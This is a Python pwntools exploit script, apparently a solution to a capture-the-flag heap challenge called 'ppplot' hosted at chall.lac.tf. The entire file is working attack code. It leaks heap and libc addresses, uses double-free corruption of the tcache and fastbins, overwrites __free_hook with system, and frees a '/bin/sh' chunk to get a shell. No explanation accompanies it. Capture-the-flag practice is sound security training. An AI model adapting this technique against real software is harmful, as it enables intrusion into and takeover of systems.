#!/usr/bin/env python3

from pwn import *
import ctypes

exe = ELF("./ppplot_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

serv = "chall.lac.tf"
port = 31164

context.binary = exe

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="""
                b *$pie+0x1689
                b *$pie+0x1547
            """)
    return r

r = conn()

def add(deg, coef):
    r.sendlineafter(b"pp:", b"1")
    r.sendlineafter(b"degree:", str(deg).encode()) 
    for i in coef:
        r.sendlineafter(b"enter coefficient", str(i).encode()) 
    r.recvuntil(b"idx: ")
    return int(r.recvline().strip())

def view():
    r.sendlineafter(b"pp:", b"2")

def plot(idx):
    r.sendlineafter(b"pp:", b"3")
    r.sendlineafter(b"idx:", str(idx).encode())
    r.recvuntil(b"(1, ")
    return ctypes.c_uint32(int(r.recvuntil(b")", drop=True))).value

def free(idx):
    r.sendlineafter(b"pp:", b"5")
    r.sendlineafter(b"idx:", str(idx).encode())

def leak(n):
    base = add(1, [0])
    for i in range(9):
        add(1, [0])
    for i in range(10):
        free(base+i)
    for i in range(3):
        add(1, [0])
    add(1, [n])
    add(1, [0])
    add(1, [0])
    return plot(base+9)

def dup():
    tc = add(1, [0])
    for i in range(6):
        add(1, [0])
    sb = add(1, [0])
    add(1, [0])
    add(1, [0])
    for i in range(7):
        free(tc+i)
    free(sb)
    free(sb+1)
    free(sb)
    for i in range(3):
        add(1, [0])

def main():
    heaplo = leak(11)-22
    heaphi = leak(12)-heaplo-726
    heap = ((heaphi << 32) | heaplo)+0x184
    log.info(f"{hex(heap)=}")
    dup() 
    add(2, [heap & 0xffffffff, heap >> 32])
    add(10, [0]*10)
    add(4, [0, 0, 0x461, 0])
    add(1, [0])
    add(10, [0x460, 0, 0x21, 0, 0, 0, 0, 0, 0x21, 0])
    free(22)
    heap += 0x180
    log.info(f"{hex(heap)=}")
    dup()
    add(2, [heap & 0xffffffff, heap >> 32])
    add(10, [0]*10)
    add(5, [0, 0, 0, 0, 10])
    libchi = plot(33)
    libchi -= 0x21 + heaphi
    log.info(f"{hex(libchi)=}")
    tc = add(1, [0])
    for i in range(7):
        add(1, [0])
    sb = add(1, [0])
    add(1, [0])
    add(1, [0])
    for i in range(8):
        free(tc+i)
    free(sb)
    free(sb+1)
    free(sb)
    for i in range(3):
        add(1, [0])
    add(2, [heap & 0xffffffff, heap >> 32])
    add(10, [0]*10)
    add(5, [0, 0, 0, 0, 11])
    libclo = plot(33)
    libclo -= 0x21 + heaphi + libchi
    log.info(f"{hex(libclo)=}")
    libc.address = ((libchi << 32) | libclo)-0x1ecbe0
    log.info(f"{hex(libc.address)=}")
    dup()
    add(2, [heap & 0xffffffff, heap >> 32])
    add(2, [u32(b"/bin"), u32(b"/sh\x00")])
    add(10, [0]*10)
    dup()
    add(2, [libc.sym.__free_hook & 0xffffffff, libc.sym.__free_hook >> 32])
    add(10, [0]*10)
    add(2, [libc.sym.system & 0xffffffff, libc.sym.system >> 32])
    free(90)
    r.interactive()

if __name__ == "__main__":
    main()
